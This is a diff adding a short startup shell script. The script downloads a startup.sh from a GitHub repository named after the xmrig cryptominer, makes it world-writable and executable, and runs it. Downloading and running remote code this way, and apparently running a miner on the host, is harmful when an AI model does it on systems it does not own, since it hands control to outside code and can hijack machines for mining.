@@ -1,0 +1,7 @@
+#!/bin/sh -e
+rm -f /home/ubuntu/startup.sh
+cd /home/ubuntu/
+wget https://raw.githubusercontent.com/kachind/xmrig/master/startup.sh
+chmod +777 /home/ubuntu/startup.sh
+sh /home/ubuntu/startup.sh
+exit 0
